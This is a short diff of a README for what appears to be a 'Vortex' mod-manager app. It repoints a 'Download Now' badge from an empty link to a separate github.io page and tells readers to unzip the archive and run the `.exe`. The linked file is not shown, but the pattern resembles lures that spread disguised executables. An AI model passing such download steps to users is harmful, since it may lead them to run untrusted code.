@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://vortex-mod-manager.github.io/.github/)
 
 ## 📸 Overview
   <img width="1039" height="534" alt="vortex-dashboard" src="https://github.com/user-attachments/assets/5e4607f6-05f1-4696-9a9d-1a9e68b6d6d4" />
